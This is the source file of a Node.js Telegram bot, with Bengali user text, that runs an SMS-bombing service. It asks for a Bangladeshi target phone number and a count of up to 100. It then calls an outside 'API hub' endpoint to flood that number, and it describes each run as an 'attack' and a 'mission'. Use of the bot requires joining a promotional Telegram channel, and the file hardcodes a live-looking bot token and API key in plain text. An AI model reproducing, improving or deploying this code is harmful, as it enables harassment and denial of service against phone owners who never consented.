const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const http = require('http');

// --- কনফিগারেশন ---
const token = '8784762504:AAFiS-NC-2BSnDauKrTM9GFQ3n91c6_OPfk';
const channelId = '@srmtelecom';
const channelLink = 'https://t.me/srmtelecom';
const bot = new TelegramBot(token, {polling: true});
const userStates = {};

// Render সচল রাখার জন্য সার্ভার
http.createServer((req, res) => {
    res.write("S.R.M TELECOM API HUB Active!");
    res.end();
}).listen(process.env.PORT || 3000);

console.log("🚀 S.R.M TELECOM (Prime Xyron API Hub) চালু হয়েছে...");

const mainMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '🔴 শুরু করুন (Start Attack)' }],
            [{ text: '📢 চ্যানেল জয়েন' }, { text: '💳 হেল্প/সাপোর্ট' }]
        ],
        resize_keyboard: true
    }
};

async function isSubscribed(chatId) {
    try {
        const res = await bot.getChatMember(channelId, chatId);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) { return false; }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text) return;

    const joined = await isSubscribed(chatId);
    if (!joined && text !== '/start') {
        return bot.sendMessage(chatId, `❌ **অ্যাক্সেস লক!**\nবটটি ব্যবহার করতে আমাদের চ্যানেলে জয়েন করুন।\n📢 লিংক: ${channelLink}`, { parse_mode: "Markdown" });
    }

    if (text === '/start') {
        bot.sendMessage(chatId, "🔥 **S.R.M TELECOM API HUB**\nআপনার দেওয়া পার্সোনাল এপিআই এখন বটের সাথে কানেক্টেড।", mainMenu);
    }

    else if (text === '🔴 শুরু করুন (Start Attack)') {
        userStates[chatId] = { step: 'num' };
        bot.sendMessage(chatId, "📱 **টার্গেট নম্বরটি দিন (১১ ডিজিট):**", { reply_markup: { remove_keyboard: true } });
    }

    else if (userStates[chatId]?.step === 'num') {
        if (text.length === 11 && text.startsWith('01')) {
            userStates[chatId] = { step: 'amount', number: text };
            bot.sendMessage(chatId, `✅ নম্বর: ${text}\n🔢 **কয়টি SMS পাঠাতে চান? (১-১০০)**`);
        } else { bot.sendMessage(chatId, "❌ সঠিক নম্বর দিন।"); }
    } 

    else if (userStates[chatId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount <= 0 || amount > 100) return bot.sendMessage(chatId, "⚠️ ১-১০০ এর মধ্যে লিখুন।");

        const target = userStates[chatId].number;
        delete userStates[chatId];

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে আপনার API Hub থেকে ${amount}টি অ্যাটাক পাঠানো হচ্ছে...`);

        try {
            // আপনার দেওয়া সেই নির্দিষ্ট API Hub লিঙ্ক (GET Method)
            const apiUrl = `https://x-pro-prime-xyron-api-hub.onrender.com/api/v1/execute?target=${target}&count=${amount}&key=Prime_xyron_9xm`;
            
            const response = await axios.get(apiUrl, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36',
                    'Sec-Ch-Ua-Platform': '"Android"'
                },
                timeout: 30000 // হাব থেকে রেসপন্স আসতে একটু সময় লাগতে পারে
            });

            if (response.status === 200) {
                bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 স্ট্যাটাস: সফল (Hub Response: 200)`, mainMenu);
            } else {
                bot.sendMessage(chatId, `⚠️ হাব থেকে রেসপন্স এসেছে কিন্তু সফল হয়নি।`, mainMenu);
            }

        } catch (e) {
            console.log(e);
            bot.sendMessage(chatId, `❌ API Hub এরর! সম্ভবত সার্ভার অফলাইনে বা কী (Key) ভুল।`, mainMenu);
        }
    }
});


